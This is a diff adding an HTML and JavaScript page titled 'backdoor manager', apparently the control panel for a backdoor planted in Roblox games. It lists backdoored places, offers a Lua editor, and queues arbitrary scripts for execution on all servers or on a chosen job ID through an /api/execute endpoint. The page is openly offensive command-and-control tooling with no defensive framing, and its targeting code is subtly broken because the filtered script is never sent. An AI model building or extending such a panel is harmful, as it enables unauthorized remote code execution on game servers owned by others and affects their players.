@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Backdoor</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.29.1/min/vs/editor/editor.main.min.css" rel="stylesheet" />
+    <style>
+      html, body { height: 100%; margin: 0; }
+      body {
+        display: flex; flex-direction: column; align-items: center;
+        justify-content: flex-start; gap: 12px; padding: 12px; overflow-x: hidden;
+      }
+      h1 { margin: 8px 0; text-align: center; }
+
+      .toolbar, #editor, .actions, #status { width: min(900px, 90vw); }
+
+      .toolbar { display: flex; justify-content: center; }
+      #editor { height: 70vh; border: 1px solid #ccc; }
+
+      .actions { display: flex; justify-content: center; align-items: center; gap: 10px; margin-top: 8px; }
+      .hidden { display: none !important; }
+
+      .actions button { display: inline-flex; width: auto; white-space: nowrap; }
+      #status { font: 12px system-ui, sans-serif; color: #333; min-height: 1em; }
+      #status.error { color: #b00020; }
+      #status.ok { color: #0a7a0a; }
+    </style>
+  </head>
+  <body>
+    <h1>backdoor manager</h1>
+
+    <div class="toolbar">
+      <select name="games" id="backdoored"></select>
+    </div>
+
+    <div id="editor"></div>
+
+    <button id="allservers">execute across all servers</button>
+
+    <div class="actions" id="actions">
+      <button id="specjobid">execute across specific jobid</button>
+      <input type="text" id="jobidInput" placeholder="jobid here" />
+    </div>
+
+    <div id="status" aria-live="polite"></div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.29.1/min/vs/loader.min.js"></script>
+    <script>
+      // --- Monaco init ---
+      let editor;
+      require.config({ paths: { vs: "https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.29.1/min/vs" } });
+      require(["vs/editor/editor.main"], function () {
+        editor = monaco.editor.create(document.getElementById("editor"), {
+          value: "--hello world\n",
+          language: "lua",
+          theme: "vs-dark",
+          automaticLayout: true
+        });
+      });
+
+      // --- Elements ---
+      const selectEl   = document.getElementById("backdoored");
+      const actionsRow = document.getElementById("actions");
+      const allBtn     = document.getElementById("allservers");
+      const jobBtn     = document.getElementById("specjobid");
+      const jobInput   = document.getElementById("jobidInput");
+      const statusEl   = document.getElementById("status");
+
+      // --- Dropdown live options (/api/options) ---
+      function normalizeOptions(data) {
+        const out = [];
+        const push = (id, label) => { if (id == null) return; out.push({ id: String(id), label: String(label ?? id) }); };
+
+        if (Array.isArray(data)) {
+          for (const item of data) {
+            if (item && typeof item === "object") {
+              const id = item.placeId ?? item.placeid ?? item.id ?? item.value;
+              const label = item.label ?? item.name ?? item.text ?? item.title ?? id;
+              push(id, label);
+            } else { push(item, item); }
+          }
+        } else if (data && typeof data === "object") {
+          for (const [id, label] of Object.entries(data)) push(id, label);
+        }
+        return out;
+      }
+
+      function renderOptions(items, keepSelection = true) {
+        const prev = keepSelection ? selectEl.value : null;
+        const frag = document.createDocumentFragment();
+
+        const allOpt = document.createElement("option");
+        allOpt.value = "all";
+        allOpt.textContent = "ALL PLACES";
+        frag.appendChild(allOpt);
+
+        const seen = new Set();
+        items
+          .filter(o => o && o.id != null)
+          .sort((a, b) => a.label.localeCompare(b.label))
+          .forEach(({ id, label }) => {
+            if (seen.has(id)) return;
+            seen.add(id);
+            const opt = document.createElement("option");
+            opt.value = id;
+            opt.textContent = label;
+            frag.appendChild(opt);
+          });
+
+        selectEl.innerHTML = "";
+        selectEl.appendChild(frag);
+
+        if (prev && [...selectEl.options].some(o => o.value === prev)) {
+          selectEl.value = prev;
+        } else {
+          selectEl.value = "all";
+        }
+        actionsRow.classList.toggle("hidden", selectEl.value === "all");
+      }
+
+      async function fetchAndUpdateOptions() {
+        try {
+          const res = await fetch("/api/options", { cache: "no-store", credentials: "same-origin" });
+          if (!res.ok) throw new Error("HTTP " + res.status);
+          const items = normalizeOptions(await res.json());
+          renderOptions(items);
+        } catch (err) {
+          // Keep current options; still apply visibility
+          actionsRow.classList.toggle("hidden", selectEl.value === "all");
+        }
+      }
+
+      selectEl.addEventListener("change", () => {
+        actionsRow.classList.toggle("hidden", selectEl.value === "all");
+      });
+
+      fetchAndUpdateOptions();
+      setInterval(fetchAndUpdateOptions, 2000);
+
+      // --- Execute helpers ---
+      function setStatus(msg, ok = true) {
+        statusEl.textContent = msg || "";
+        statusEl.classList.toggle("ok", !!ok);
+        statusEl.classList.toggle("error", !ok);
+      }
+      function rand6() { return Math.random().toString(36).slice(2, 8); }
+      function uuidv4() {
+            return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c =>
+                (+c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +c / 4).toString(16)
+            );
+      }
+      async function queueScript({ mode }) {
+        // mode: 'allservers' or 'job'
+        const code = editor ? editor.getValue() : "";
+        if (!code.trim()) { setStatus("Nothing to execute (editor is empty).", false); return; }
+
+        const selected = selectEl.value; // "all" or a specific placeId
+        const now = Date.now();
+
+        const uniqueId = uuidv4();
+        let targetScript = ''
+        if (mode === "job") {
+            targetScript = 'if game.JobId ~= ' + jobInput.value + ' then return end; '
+        }
+        if (mode === "allservers") {
+            targetScript = 'if game.PlaceId ~= ' + selectEl.value + ' then return end; '
+        }
+        targetScript = targetScript + code
+        // POST to /api/execute
+        try {
+          setStatus("Queuing script…");
+          allBtn.disabled = true; jobBtn.disabled = true;
+          const res = await fetch("/api/execute", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "same-origin",
+            body: JSON.stringify({ uniqueId, pendingScriptToAdd: code })
+          });
+          if (!res.ok) {
+            const text = await res.text();
+            throw new Error(`HTTP ${res.status}: ${text}`);
+          }
+          const data = await res.json().catch(() => ({}));
+          setStatus(`Queued (${data.uniqueId || uniqueId}). Expires in ~30s.`, true);
+        } catch (e) {
+          setStatus(`Failed to queue: ${e.message}`, false);
+        } finally {
+          allBtn.disabled = false; jobBtn.disabled = false;
+        }
+      }
+
+      // --- Button events ---
+      allBtn.addEventListener("click", () => queueScript({ mode: "allservers" }));
+      jobBtn.addEventListener("click", () => queueScript({ mode: "job" }));
+
+      // Optional: Ctrl+Enter triggers "all servers" for current selection
+      document.addEventListener("keydown", (e) => {
+        if ((e.ctrlKey || e.metaKey) && e.key === "Enter") queueScript({ mode: "allservers" });
+      });
+    </script>
+  </body>
+</html>
